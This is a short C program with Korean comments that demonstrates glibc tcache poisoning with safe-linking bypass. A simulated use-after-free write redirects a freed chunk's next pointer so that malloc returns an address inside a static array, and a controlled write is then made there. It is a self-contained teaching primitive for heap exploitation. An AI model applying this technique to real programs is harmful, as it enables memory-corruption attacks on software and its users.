#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static unsigned char target[0x80]
    __attribute__((aligned(16)));

int main(void)
{
    char *b = malloc(0x30);
    char *a = malloc(0x30);

    if (a == NULL || b == NULL) {
        perror("malloc");
        return 1;
    }

    printf("a              = %p\n", (void *)a);
    printf("b              = %p\n", (void *)b);
    printf("target         = %p\n", (void *)target);
    printf("target + 0x20  = %p\n", (void *)(target + 0x20));

    /*
     * 같은 size class인 tcache[0x40]에 다음 상태를 만든다.
     *
     * a -> b -> NULL
     */
    free(b);
    free(a);

    uintptr_t goal = (uintptr_t)(target + 0x20);

    /*
     * safe-linking:
     *
     * stored_next = actual_next ^ (storage_position >> 12)
     *
     * a의 next 필드는 a 주소에 저장되므로 a >> 12를 사용한다.
     */
    uintptr_t encoded_goal =
        goal ^ ((uintptr_t)a >> 12);

    /*
     * UAF write를 가정하여 a의 encoded next를 조작한다.
     *
     * 기존:
     * a -> b
     *
     * 조작 후:
     * a -> target + 0x20
     */
    *(uintptr_t *)a = encoded_goal;

    /*
     * target + 0x20이 fake tcache entry가 된다.
     *
     * 이 fake entry의 next를 NULL로 만들기 위해
     * safe-linking된 NULL 값을 저장한다.
     *
     * encoded NULL:
     * 0 ^ (goal >> 12) == goal >> 12
     */
    *(uintptr_t *)(target + 0x20) = goal >> 12;

    printf("\n[after poisoning]\n");
    printf("encoded_goal   = %#lx\n",
           (unsigned long)encoded_goal);
    printf("fake next      = %#lx\n",
           (unsigned long)*(uintptr_t *)(target + 0x20));

    /*
     * 첫 번째 malloc:
     * p = a
     *
     * 두 번째 malloc:
     * q = target + 0x20
     */
    char *p = malloc(0x30);
    char *q = malloc(0x30);

    printf("\n[allocation result]\n");
    printf("p              = %p\n", (void *)p);
    printf("q              = %p\n", (void *)q);
    printf("expected q     = %p\n", (void *)(target + 0x20));

    if (p != a) {
        fprintf(stderr, "[-] p != a\n");
        return 1;
    }

    if (q != (char *)(target + 0x20)) {
        fprintf(stderr, "[-] controlled allocation failed\n");
        return 1;
    }

    puts("[+] controlled allocation succeeded");

    /*
     * q가 target + 0x20을 가리키므로
     * q를 통한 write가 target 배열 내부에 반영된다.
     */
    memset(q, 'A', 8);

    printf("\n[write result]\n");
    printf("target+0x20 raw = %#lx\n",
           (unsigned long)*(uintptr_t *)(target + 0x20));

    if (*(uintptr_t *)(target + 0x20)
        == 0x4141414141414141ULL) {
        puts("[+] targeted write succeeded");
    } else {
        puts("[-] targeted write failed");
        return 1;
    }

    return 0;
}
